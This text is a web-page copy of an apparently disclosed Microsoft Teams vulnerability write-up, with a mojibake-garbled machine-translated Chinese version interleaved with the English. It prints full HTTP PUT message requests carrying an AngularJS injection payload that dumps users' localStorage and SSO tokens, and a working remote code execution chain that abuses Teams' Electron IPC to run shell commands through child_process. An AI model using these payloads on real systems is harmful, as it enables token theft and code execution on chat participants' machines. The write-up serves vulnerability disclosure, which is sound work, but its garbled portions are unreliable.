&#34;:  &#34; &#34;,  &#34;subject &#34;: null,  &#34;mentions &#34;:  &#34;[{ \&#34;@type \&#34;: \&#34;http://schema.skype.com/Mention \&#34;, \&#34;itemid \&#34;:0, \&#34;tagId \&#34;: \&#34;tHab2TLzpa \&#34;, \&#34;mri \&#34;: \&#34;tHab2TLzpa \&#34;, \&#34;mentionType \&#34;: \&#34;tag \&#34;, \&#34;displayName \&#34;: \&#34;x marks the spot \&#34;}] &#34;}}</p><p>PUT /v1/users/ME/conversations/19%3A9bc6400d2fc7443487491898c6803e46%40thread.tacv2/messages/1598607494949 HTTP / 1.1ä¸»æœºï¼šemea.ng.msg.teams.microsoft.comç”¨æˆ·ä»£ç†ï¼šMozilla / 5.0ï¼ˆMacintoshï¼› Intel Mac OS X 10.15; rvï¼š81.0ï¼‰Gecko / 20100101 Firefox / 81.0 Acceptï¼šjson Accept-Languageï¼šzh-cnï¼Œen; q = 0.5 Accept-Encodingï¼šgzipï¼Œdeflate Content-Typeï¼šapplication / jsonèº«ä»½éªŒè¯ï¼šskypetoken = ...å‰ª... ClientInfoï¼šos = macos; osVer = 10; proc = x86; lcid = zh-cn; deviceType = 1; country = us; clientName = skypeteams; clientVer = 1415 / 1.0.0.2020080725; utcOffset = + 03ï¼š00 BehaviorOverrideï¼šredirectAs404 Content-Lengthï¼š1174 {ï¼†ï¼ƒ34; contentï¼†ï¼ƒ34 ;:ï¼†ï¼ƒ34;ï¼†lt; divï¼†gt;ï¼†lt; divï¼†gt; \ nï¼†lt; divï¼†gt; \ nï¼†lt; divï¼†gt; \ nï¼†lt; divï¼†gt; \ nï¼†lt; divï¼†gt;ï¼†lt; span itemscope itemtype = \ï¼†ï¼ƒ34; httpï¼š//schema.skype.com/Mention \ï¼†ï¼ƒ34; itemid = \ï¼†ï¼ƒ34; 0 \ï¼†ï¼ƒ34; dadaï¼†lt; / spanï¼†gt;ï¼†lt; / divï¼†gt; \ nï¼†lt; / divï¼†gt; \ nï¼†lt; / divï¼†gt; \ nï¼†lt; / divï¼†gt; \ nï¼†lt; / divï¼†gt; \ nï¼†lt; / divï¼†gt; ï¼†ï¼ƒ34;ï¼Œï¼†ï¼ƒ34;æ¶ˆæ¯ç±»å‹ï¼†ï¼ƒ34;ï¼šï¼†ï¼ƒ34; RichText / Htmlï¼†ï¼ƒ34;ï¼Œï¼†ï¼ƒ34;å†…å®¹ç±»å‹ï¼†ï¼ƒ34;ï¼šï¼†ï¼ƒ34;æ–‡æœ¬ï¼†ï¼ƒ34;ï¼Œï¼†ï¼ƒ34 ; amsreferencesï¼†ï¼ƒ34;ï¼š[]ï¼Œï¼†ï¼ƒ34; clientmessageidï¼†ï¼ƒ34 ;:ï¼†ï¼ƒ34; 9868848366534370000ï¼†ï¼ƒ34 ;,ï¼†ï¼ƒ34; imdisplaynameï¼†ï¼ƒ34 ;:ï¼†ï¼ƒ34; Oskars Vegerisï¼†ï¼ƒ34; ï¼Œï¼†ï¼ƒ34;å±æ€§ï¼†ï¼ƒ34;ï¼š{ï¼†ï¼ƒ34;é‡è¦æ€§ï¼†ï¼ƒ34 ;:ï¼†ï¼ƒ34; ï¼†ï¼ƒ34 ;ã€ï¼†ï¼ƒ34;ä¸»é¢˜ï¼šnullï¼Œï¼†ï¼ƒ34;æåŠï¼†ï¼ƒ34 ;ï¼šï¼†ï¼ƒ34; [{\ï¼†ï¼ƒ34; @type \ï¼†ï¼ƒ34 ;ï¼š \ï¼†ï¼ƒ34 ; httpï¼š//schema.skype.com/Mention \ï¼†ï¼ƒ34;ï¼Œ\ï¼†ï¼ƒ34; itemid \ï¼†ï¼ƒ34;ï¼š0ï¼Œ\ï¼†ï¼ƒ34; tagId \ï¼†ï¼ƒ34 ;ï¼š \ï¼†ï¼ƒ34; tHab2TLzpa \ï¼†ï¼ƒ34;ï¼Œ\ï¼†ï¼ƒ34;ï¼š\ï¼†ï¼ƒ34; tHab2TLzpa \ï¼†ï¼ƒ34;ï¼Œ\ï¼†mentionType \ï¼†ï¼ƒ34;ï¼š\ï¼†ï¼ƒ34;æ ‡è®°\ï¼† ï¼ƒ34;ï¼Œ\ï¼†ï¼ƒ34; displayName \ï¼†ï¼ƒ34 ;ï¼š \ï¼†ï¼ƒ34; xæ ‡è®°äº†ç‚¹\ï¼†ï¼ƒ34;}]ï¼†ï¼ƒ34;}}</p><p> angular expression filtering can be bypassed by injecting a nullbyte char in unicode  \u0000, e.g.</p><p> å¯ä»¥é€šè¿‡åœ¨Unicode \ u0000ä¸­æ’å…¥ä¸€ä¸ªç©ºå­—èŠ‚charæ¥ç»•è¿‡è§’åº¦è¡¨è¾¾å¼è¿‡æ»¤ï¼Œä¾‹å¦‚</p><p>  To access user&#39;s local storage and all SSO tokens, use this payload within  displayName in the above HTTP PUT request.</p><p>  è¦è®¿é—®ç”¨æˆ·çš„æœ¬åœ°å­˜å‚¨å’Œæ‰€æœ‰SSOä»¤ç‰Œï¼Œè¯·åœ¨ä¸Šè¿°HTTP PUTè¯·æ±‚ä¸­çš„displayNameä¸­ä½¿ç”¨æ­¤æœ‰æ•ˆè´Ÿè½½ã€‚</p><p>   PUT  /v1/users/ME/conversations/19%3A9bc6400d2fc7443487491898c6803e46%40thread.tacv2/messages/1598607494949 HTTP/1.1  Host: emea.ng.msg.teams.microsoft.com  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0  Accept: json  Accept-Language: en-US,en;q=0.5  Accept-Encoding: gzip, deflate  Content-Type: application/json  Authentication: skypetoken=...snip...  ClientInfo: os=macos; osVer=10; proc=x86; lcid=en-us; deviceType=1; country=us; clientName=skypeteams; clientVer=1415/1.0.0.2020080725; utcOffset=+03:00  BehaviorOverride: redirectAs404  Content-Length: 1174{  &#34;content &#34;:  &#34;&lt;div&gt;&lt;div&gt; \n&lt;div&gt; \n&lt;div&gt; \n&lt;div&gt; \n&lt;div&gt;&lt;span itemscope itemtype= \&#34;http://schema.skype.com/Mention \&#34; itemid= \&#34;0 \&#34;&gt;dada&lt;/span&gt;&lt;/div&gt; \n&lt;/div&gt; \n&lt;/div&gt; \n&lt;/div&gt; \n&lt;/div&gt; \n&lt;/div&gt; &#34;,  &#34;messagetype &#34;:  &#34;RichText/Html &#34;,  &#34;contenttype &#34;:  &#34;text &#34;,  &#34;amsreferences &#34;:[],  &#34;clientmessageid &#34;:  &#34;9868848366534370000 &#34;,  &#34;imdisplayname &#34;:  &#34;Oskars Vegeris &#34;,  &#34;properties &#34;:{  &#34;importance &#34;:  &#34; &#34;,  &#34;subject &#34;: null,  &#34;mentions &#34;:  &#34;[{ \&#34;@type \&#34;: \&#34;http://schema.skype.com/Mention \&#34;, \&#34;itemid \&#34;:0, \&#34;tagId \&#34;: \&#34;tHab2TLzpa \&#34;, \&#34;mri \&#34;: \&#34;tHab2TLzpa \&#34;, \&#34;mentionType \&#34;: \&#34;tag \&#34;, \&#34;displayName \&#34;: \&#34;x marks the spot{{[&#39;if(typeof onetime==`undefined`){onetime=1;console.log(localStorage);}&#39;].forEach($root.$$childHead.$$nextSibling.app.$window.eval)} \u0000} \&#34;}] &#34;}}</p><p>   PUT /v1/users/ME/conversations/19%3A9bc6400d2fc7443487491898c6803e46%40thread.tacv2/messages/1598607494949 HTTP / 1.1ä¸»æœºï¼šemea.ng.msg.teams.microsoft.comç”¨æˆ·ä»£ç†ï¼šMozilla / 5.0ï¼ˆMacintoshï¼› Intel Mac OS X 10.15; rvï¼š81.0ï¼‰Gecko / 20100101 Firefox / 81.0 Acceptï¼šjson Accept-Languageï¼šzh-cnï¼Œen; q = 0.5 Accept-Encodingï¼šgzipï¼Œdeflate Content-Typeï¼šapplication / jsonèº«ä»½éªŒè¯ï¼šskypetoken = ...å‰ª... ClientInfoï¼šos = macos; osVer = 10; proc = x86; lcid = zh-cn; deviceType = 1; country = us; clientName = skypeteams; clientVer = 1415 / 1.0.0.2020080725; utcOffset = + 03ï¼š00 BehaviorOverrideï¼šredirectAs404 Content-Lengthï¼š1174 {ï¼†ï¼ƒ34; contentï¼†ï¼ƒ34 ;:ï¼†ï¼ƒ34;ï¼†lt; divï¼†gt;ï¼†lt; divï¼†gt; \ nï¼†lt; divï¼†gt; \ nï¼†lt; divï¼†gt; \ nï¼†lt; divï¼†gt; \ nï¼†lt; divï¼†gt;ï¼†lt; span itemscope itemtype = \ï¼†ï¼ƒ34; httpï¼š//schema.skype.com/Mention \ï¼†ï¼ƒ34; itemid = \ï¼†ï¼ƒ34; 0 \ï¼†ï¼ƒ34; dadaï¼†lt; / spanï¼†gt;ï¼†lt; / divï¼†gt; \ nï¼†lt; / divï¼†gt; \ nï¼†lt; / divï¼†gt; \ nï¼†lt; / divï¼†gt; \ nï¼†lt; / divï¼†gt; \ nï¼†lt; / divï¼†gt; ï¼†ï¼ƒ34;ï¼Œï¼†ï¼ƒ34;æ¶ˆæ¯ç±»å‹ï¼†ï¼ƒ34 ;ï¼šï¼†ï¼ƒ34; RichText / Htmlï¼†ï¼ƒ34 ;ã€ï¼†ï¼ƒ34; contenttypeï¼†ï¼ƒ34 ;ï¼šï¼†ï¼ƒ34; textï¼†ï¼ƒ34 ;ã€ï¼†ï¼ƒ34 ; amsreferencesï¼†ï¼ƒ34;ï¼š[]ï¼Œï¼†ï¼ƒ34; clientmessageidï¼†ï¼ƒ34 ;:ï¼†ï¼ƒ34; 9868848366534370000ï¼†ï¼ƒ34 ;,ï¼†ï¼ƒ34; imdisplaynameï¼†ï¼ƒ34 ;:ï¼†ï¼ƒ34; Oskars Vegerisï¼†ï¼ƒ34; ï¼Œï¼†ï¼ƒ34;å±æ€§ï¼†ï¼ƒ34;ï¼š{ï¼†ï¼ƒ34;é‡è¦æ€§ï¼†ï¼ƒ34 ;:ï¼†ï¼ƒ34; ï¼†ï¼ƒ34 ;ã€ï¼†ï¼ƒ34;ä¸»é¢˜ï¼šnullï¼Œï¼†ï¼ƒ34;æåŠï¼†ï¼ƒ34 ;ï¼šï¼†ï¼ƒ34; [{\ï¼†ï¼ƒ34; @type \ï¼†ï¼ƒ34 ;ï¼š \ï¼†ï¼ƒ34 ; httpï¼š//schema.skype.com/Mention \ï¼†ï¼ƒ34;ï¼Œ\ï¼†ï¼ƒ34; itemid \ï¼†ï¼ƒ34;ï¼š0ï¼Œ\ï¼†ï¼ƒ34; tagId \ï¼†ï¼ƒ34 ;ï¼š \ï¼†ï¼ƒ34; tHab2TLzpa \ï¼†ï¼ƒ34;ï¼Œ\ï¼†ï¼ƒ34;ï¼š\ï¼†ï¼ƒ34; tHab2TLzpa \ï¼†ï¼ƒ34;ï¼Œ\ï¼†mentionType \ï¼†ï¼ƒ34;ï¼š\ï¼†ï¼ƒ34;æ ‡è®°\ï¼† ï¼ƒ34;ï¼Œ\ï¼†ï¼ƒ34; displayName \ï¼†ï¼ƒ34 ;ï¼š \ï¼†ï¼ƒ34; xæ ‡è®°è¯¥ç‚¹{{{ï¼†ï¼ƒ39; ifï¼ˆtypeof onetime ==`undefined`ï¼‰{onetime = 1; console.log ï¼ˆlocalStorageï¼‰;}ï¼†ï¼ƒ39;]ã€‚forEachï¼ˆ$ rootã€‚$$ childHeadã€‚$$ nextSibling.appã€‚$ window.evalï¼‰} \ u0000} \ï¼†ï¼ƒ34;}]ï¼†ï¼ƒ34;}}</p><p>  no further actions are necessary. all users within this chat will start logging their SSO tokens which can be exfiltrated.</p><p>  æ— éœ€é‡‡å–è¿›ä¸€æ­¥æªæ–½ã€‚èŠå¤©ä¸­çš„æ‰€æœ‰ç”¨æˆ·å°†å¼€å§‹è®°å½•å…¶SSOä»¤ç‰Œï¼Œè¿™äº›ä»¤ç‰Œå¯ä»¥è¢«çªƒå–ã€‚</p><p> you can verify this by checking development tools in either Microsoft Teams desktop or any browser.</p><p> æ‚¨å¯ä»¥é€šè¿‡åœ¨Microsoft Teamsæ¡Œé¢æˆ–ä»»ä½•æµè§ˆå™¨ä¸­æ£€æŸ¥å¼€å‘å·¥å…·æ¥éªŒè¯è¿™ä¸€ç‚¹ã€‚</p><p>  A novel remote code execution payload was developed, which bypasses all restrictions currently implemented (remote require, node integration, webview preload filtering etc.) in Microsoft Teams desktop and should work even if  contextIsolation was enabled.</p><p>  å¼€å‘äº†ä¸€ç§æ–°é¢–çš„è¿œç¨‹ä»£ç æ‰§è¡Œæœ‰æ•ˆè´Ÿè½½ï¼Œè¯¥è´Ÿè½½ç»•è¿‡äº†Microsoft Teamsæ¡Œé¢ä¸­å½“å‰å®æ–½çš„æ‰€æœ‰é™åˆ¶ï¼ˆè¿œç¨‹éœ€æ±‚ï¼ŒèŠ‚ç‚¹é›†æˆï¼ŒWebviewé¢„åŠ è½½è¿‡æ»¤ç­‰ï¼‰ï¼Œå³ä½¿å¯ç”¨äº†contextIsolationï¼Œå®ƒä¹Ÿå¯ä»¥æ­£å¸¸å·¥ä½œã€‚ </p><p> cmd  =  `open /Applications/Calculator.app`  // change to windows/linux command as required stage1  =  `data:text/plain,cp=require(&#39;child_process&#39;);cp.exec(&#39;  ${ cmd }&#39;)` ;  // create a virtual file to download this . electronSafeIpc . send ( `desktopFileDownload` ,  stage1 ) ;  // request to download file // implement an event handler when files downloaded to trigger payload this . electronSafeIpc . on ( `desktop-file-download-finished` ,  ( _ ,  fileinfo )  =&gt;  {  f  =  fileinfo . uniqueFile . filePath ;  // event gives us file path which we don&#39;t know beforehand  // create a new webview mockup - window with a webview tag and our virtual, downloaded file as preload  stage2  =  `data:text/html,&lt;webview src=&#39;about:blank&#39; preload=&#39;file:///  ${ f }&#39;&gt;&lt;/webview&gt;`  this . electronSafeIpc . send ( `allowWindowOpenUrl` ,  stage2 ) ;  // abusing MS Teams IPC API to allow above URL  this . w  =  window . open ( stage2 ) ;  // URL gets opened, webview gets created with our virtual, downloaded file preload  setTimeout ( ( ) =&gt; { this . w . close ( ) } , 1000 )  // not necessary, but let&#39;s close the custom window  } )</p><p>cmd =`open / Applications / Calculator.app` //æ ¹æ®éœ€è¦æ›´æ”¹ä¸ºWindows / linuxå‘½ä»¤stage1 =`dataï¼štext / plainï¼Œcp = requireï¼ˆï¼†ï¼ƒ39; child_processï¼†ï¼ƒ39;ï¼‰; cp.execï¼ˆï¼†ï¼ƒ 39; $ {cmd}ï¼†ï¼ƒ39;ï¼‰`; //åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ä»¥ä¸‹è½½æ­¤æ–‡ä»¶ã€‚ electronicSafeIpcã€‚å‘é€ï¼ˆ`desktopFileDownload`ï¼Œstage1ï¼‰; //è¯·æ±‚ä¸‹è½½æ–‡ä»¶//åœ¨ä¸‹è½½æ–‡ä»¶ä»¥è§¦å‘æœ‰æ•ˆè½½è·thisæ—¶å®ç°äº‹ä»¶å¤„ç†ç¨‹åºã€‚ electronicSafeIpcã€‚ onï¼ˆ`desktop-file-download-finished`ï¼Œï¼ˆ_ï¼Œfileinfoï¼‰=ï¼†gt; {f = fileinfoã€‚uniqueFileã€‚filePath; //äº‹ä»¶ä¸ºæˆ‘ä»¬æä¾›äº†æˆ‘ä»¬äº‹å…ˆä¸çŸ¥é“çš„æ–‡ä»¶è·¯å¾„//åˆ›å»ºä¸€ä¸ªæ–°webviewæ ·æœº-å…·æœ‰webviewæ ‡è®°å’Œæˆ‘ä»¬è™šæ‹Ÿä¸‹è½½çš„æ–‡ä»¶çš„çª—å£ï¼Œä½œä¸ºé¢„åŠ è½½stage2 =`dataï¼štext / htmlï¼Œï¼†lt; webview src =ï¼†ï¼ƒ39; aboutï¼šblankï¼†ï¼ƒ39; preload =ï¼†ï¼ƒ39; fileï¼š// / $ {f}ï¼†ï¼ƒ39;ï¼†lt; / webviewï¼†gt;`this.electronSafeIpcã€‚sendï¼ˆ`allowWindowOpenUrl`ï¼Œstage2ï¼‰; //æ»¥ç”¨MS Teams IPC APIå…è®¸ä¸Šé¢çš„URLæ­¤w.window.openï¼ˆstage2 ï¼‰; //æ‰“å¼€URLï¼Œå¹¶ä½¿ç”¨æˆ‘ä»¬å·²ä¸‹è½½çš„è™šæ‹Ÿä¸‹è½½æ–‡ä»¶é¢„åŠ è½½setTimeoutï¼ˆï¼ˆï¼‰=ï¼†gt; {thisã€‚wã€‚closeï¼ˆï¼‰}ï¼Œ1000ï¼‰//åˆ›å»º// WebViewï¼Œ//ä¸éœ€è¦ï¼Œä½†è®©æˆ‘ä»¬å…³é—­è‡ªå®šä¹‰çª—å£}ï¼‰</p><p>    PUT  /v1/users/ME/conversations/19%3A9bc6400d2fc7443487491898c6803e46%40thread.tacv2/messages/1598607494949 HTTP/1.1  Host: emea.ng.msg.teams.microsoft.com  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0  Accept: json  Accept-Language: en-US,en;q=0.5  Accept-Encoding: gzip, deflate  Content-Type: application/json  Authentication: ...snip...  ClientInfo: os=macos; osVer=10; proc=x86; lcid=en-us; deviceType=1; country=us; clientName=skypeteams; clientVer=1415/1.0.0.2020080725; utcOffset=+03:00  BehaviorOverride: redirectAs404  Content-Length: 1174{&#34;content&#34;:&#34;&lt;div&gt;&lt;div&gt;\n&lt;div&gt;\n&lt;div&gt;\n&lt;div&gt;\n&lt;div&gt;&lt;span itemscope itemtype=\&#34;http://schema.skype.com/Mention\&#34; itemid=\&#34;0\&#34;&gt;dada&lt;/span&gt;&lt;/div&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/div&gt;&#34;,&#34;messagetype&#34;:&#34;RichText/Html&#34;,&#34;contenttype&#34;:&#34;text&#34;,&#34;amsreferences&#34;:[],&#34;clientmessageid&#34;:&#34;9868848366534370000&#34;,&#34;imdisplayname&#34;:&#34;Oskars Vegeris&#34;,&#34;properties&#34;:{&#34;importance&#34;:&#34;&#34;,&#34;subject&#34;:null,&#34;mentions&#34;:&#34;[{\&#34;@type\&#34;:\&#34;http://schema.skype.com/Mention\&#34;,\&#34;itemid\&#34;:0,\&#34;tagId\&#34;:\&#34;tHab2TLzpa\&#34;,\&#34;mri\&#34;:\&#34;tHab2TLzpa\&#34;,\&#34;mentionType\&#34;:\&#34;tag\&#34;,\&#34;displayName\&#34;:\&#34;x marks the spot{{[&#39;if(typeof mentiontime==`undefined`){mentiontime=1;stage1=`data:text/plain,cp=require(\\\&#34;child_process\\\&#34;);cp.exec(\\\&#34;open /System/Applications/Calculator.app\\\&#34;)`;this.electronSafeIpc.send(`desktopFileDownload`,stage1);this.electronSafeIpc.on(`desktop-file-download-finished`,(_,fileinfo)=&gt;{f=fileinfo.uniqueFile.filePath;stage2=`data:text/html,&lt;webview src=\\\&#34;about:blank\\\&#34; preload=\\\&#34;file:///${f}\\\&#34;&gt;&lt;/webview&gt;`;this.electronSafeIpc.send(`allowWindowOpenUrl`,stage2);this.w=window.open(stage2);setTimeout(()=&gt;{this.w.close()},2000)})}&#39;].forEach($root.$$childHead.$$nextSibling.app.$window.eval)}\u0000}\&#34;}]&#34;}}</p><p>    PUT /v1/users/ME/conversations/19%3A9bc6400d2fc7443487491898c6803e46%40thread.tacv2/messages/1598607494949 HTTP / 1.1ä¸»æœºï¼šemea.ng.msg.teams.microsoft.comç”¨æˆ·ä»£ç†ï¼šMozilla / 5.0ï¼ˆMacintoshï¼› Intel Mac OS X 10.15; rvï¼š81.0ï¼‰Gecko / 20100101 Firefox / 81.0 Acceptï¼šjson Accept-Languageï¼šzh-cnï¼Œen; q = 0.5 Accept-Encodingï¼šgzipï¼Œdeflate Content-Typeï¼šapplication / jsonèº«ä»½éªŒè¯ï¼š... snipã€‚ .. ClientInfoï¼šos = macos; osVer = 10; proc = x86; lcid = zh-cn; deviceType = 1; country = us; clientName = skypeteams; clientVer = 1415 / 1.0.0.2020080725; utcOffset = + 03ï¼š00 BehaviorOverrideï¼šredirectAs404 Content-Lengthï¼š1174 {ï¼†ï¼ƒ34; contentï¼†ï¼ƒ34;ï¼šï¼†ï¼ƒ34;ï¼†lt; divï¼†gt;ï¼†lt; divï¼†gt; \ nï¼†lt; divï¼†gt; \ nï¼†lt; divï¼†gt; \ nï¼†lt; divï¼†gt; ; \ nï¼†lt; divï¼†gt;ï¼†lt; span itemscope itemtype = \ï¼†ï¼ƒ34; httpï¼š//schema.skype.com/Mention \ï¼†ï¼ƒ34; itemid = \ï¼†ï¼ƒ34; 0 \ï¼†ï¼ƒ34;ï¼†gt; dadaï¼†lt; / spanï¼†gt; // divï¼†gt; \ nï¼†lt; / divï¼†gt; \ nï¼†lt; / divï¼†gt; \ nï¼†lt; / divï¼†gt; \ nï¼†lt; / divï¼†gt; nï¼†lt; / divï¼†gt;ï¼†ï¼ƒ34;ï¼Œï¼†ï¼ƒ34;æ¶ˆæ¯ç±»å‹ï¼†ï¼ƒ34;ï¼šï¼†ï¼ƒ34; RichText / Htmlï¼†ï¼ƒ34;ï¼Œï¼†ï¼ƒ34;å†…å®¹ç±»å‹ï¼†ï¼ƒ34;ï¼šï¼†ï¼ƒ34;æ–‡æœ¬ï¼†ï¼ƒ34;ï¼Œï¼†ï¼ƒ 34; amsreferencesï¼†ï¼ƒ34;ï¼š[]ï¼Œï¼†ï¼ƒ34; clientmessageidï¼†ï¼ƒ34;ï¼šï¼†ï¼ƒ34; 9868848366534370000ï¼†ï¼ƒ34;ï¼Œï¼†ï¼ƒ34; imdisplaynameï¼†ï¼ƒ34;ï¼šï¼†ï¼ƒ34; Oskars Vegerisï¼†ï¼ƒ34;ï¼Œï¼†ï¼ƒ34 ; propertiesï¼†ï¼ƒ34;ï¼š{ï¼†ï¼ƒ34; importanceï¼†ï¼ƒ34;ï¼šï¼†ï¼ƒ34;ï¼†ï¼ƒ34;ï¼Œï¼†ï¼ƒ34; subjectï¼†ï¼ƒ34;ï¼šnullï¼Œï¼†ï¼ƒ34;æåŠï¼†ï¼ƒ34; ::ï¼†ï¼ƒ34; [ {\ï¼†ï¼ƒ34; @type \ï¼†ï¼ƒ34;ï¼š\ï¼†ï¼ƒ34; httpï¼š//schema.skype.com/Mention \ï¼†ï¼ƒ34;ï¼Œ\ï¼†ï¼ƒ34; itemid \ï¼†ï¼ƒ34;ï¼š0ï¼Œ \ï¼†ï¼ƒ34; tagId \ï¼†ï¼ƒ34;ï¼š\ï¼†ï¼ƒ34; tHab2TLzpa \ï¼†ï¼ƒ34;ï¼Œ\ï¼†ï¼ƒ34; mri \ï¼†ï¼ƒ34;ï¼š\ï¼†ï¼ƒ34; tHab2TLzpa \ï¼†ï¼ƒ34;ï¼Œ\ï¼† ï¼ƒ34; mentionType \ï¼†ï¼ƒ34;ï¼š\ï¼†ï¼ƒ34; tag \ï¼†ï¼ƒ34;ï¼Œ\ï¼†ï¼ƒ34; displayName \ï¼†ï¼ƒ34;ï¼š\ï¼†ï¼ƒ34; xæ ‡è®°è¯¥ç‚¹{{[[ï¼†ï¼ƒ39; ifï¼ˆtypeof saytime ==`undefined`ï¼‰{mentiontime = 1; stage1 =`dataï¼štext / plainï¼Œcp = requireï¼ˆ\\\ï¼†ï¼ƒ34; child_process \\\\ï¼†ï¼ƒ34;ï¼‰; cp.execï¼ˆ\ \\ï¼†ï¼ƒ34;æ‰“å¼€/System/Applications/Calculator.app\\\&#34;)`;this.electronSafeIpc.send(`desktopFileDownload`,stage1);this.electronSafeIpc.on(`desktop-file-downloadå®Œæˆ`ï¼Œ ï¼ˆ_ï¼Œfileinfoï¼‰=ï¼†gt; {f = fileinfo.uniqueFile.filePath; stage2 =`dataï¼štext / htmlï¼Œï¼†lt; webview src = \\\ï¼†ï¼ƒ34; aboutï¼šblank \\\ï¼†ï¼ƒ34; preload = \\\ï¼†ï¼ƒ34; fileï¼š/// $ {f} \\\ï¼†ï¼ƒ34;ï¼†gt;ï¼†lt; / webviewï¼†gt;`; this.electronSafeIpc.sendï¼ˆ`allowWindowOpenUrl`ï¼Œstage2ï¼‰; this.w = window.openï¼ˆstage2ï¼‰; setTimeoutï¼ˆï¼ˆï¼‰=ï¼†gt; {this.w.closeï¼ˆï¼‰}ï¼Œ2000ï¼‰}ï¼‰}ï¼†ï¼ƒ39;]ã€‚forEachï¼ˆ$ rootã€‚$$ childHeadã€‚$$ nextSibling.app ã€‚$ window.evalï¼‰} \ u0000} \ï¼†ï¼ƒ34;}]ï¼†ï¼ƒ34;}}</p><p>       list of SSO token identifiers in localStorage &amp;&amp; cookie parameters available from JavaScript in Microsoft Teams</p><p>       localStorageï¼†amp;ï¼†amp;ä¸­çš„SSOä»¤ç‰Œæ ‡è¯†ç¬¦åˆ—è¡¨å¯ä»Microsoft Teamsä¸­çš„JavaScriptè·å¾—cookieå‚æ•° </p></div><div id="story_share_this"><div class="sharethis-inline-share-buttons"></div></div><div class="story_tags page_narrow"><button type="button" class="btn btn-light my_tag"><a href="/tag/ms/">#ms</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/spoofing/">#spoofing</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/microsoft/">#microsoft</a></button></div></div><div class="my_movie_list_item shadow p-3 mb-5 bg-white rounded"><button type="button" class="btn btn-link my_tag"><a href="/tag/web2.0/">#web2.0</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/google/">#google</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è®¾è®¡/">#è®¾è®¡</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/åˆ›æ„/">#åˆ›æ„</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/æ‘„å½±/">#æ‘„å½±</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/æ¸¸æˆ/">#æ¸¸æˆ</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å›¾ç‰‡/">#å›¾ç‰‡</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è½¯ä»¶/">#è½¯ä»¶</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è§†é¢‘/">#è§†é¢‘</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å¹¿å‘Š/">#å¹¿å‘Š</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/æ‰‹æœº/">#æ‰‹æœº</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/iphone/">#iphone</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/ç½‘ç«™/">#ç½‘ç«™</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å…è´¹/">#å…è´¹</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/ä¸‹è½½/">#ä¸‹è½½</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/windows/">#windows</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è‹¹æœ/">#è‹¹æœ</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å¾®è½¯/">#å¾®è½¯</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/apple/">#apple</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/firefox/">#firefox</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/blog/">#blog</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/éŸ³ä¹/">#éŸ³ä¹</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/åšå®¢/">#åšå®¢</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/wordpress/">#wordpress</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/æ¶æ/">#æ¶æ</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/qq/">#qq</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è‰ºæœ¯/">#è‰ºæœ¯</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/web/">#web</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å·¥å…·/">#å·¥å…·</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/åˆ†äº«/">#åˆ†äº«</a></button></div></div></div><div id="my_footer"><div class=""><a href="/tags/">tags</a> <a href="/users/">users</a></div>&copy; 2020 diglog.com </div></div></body></html>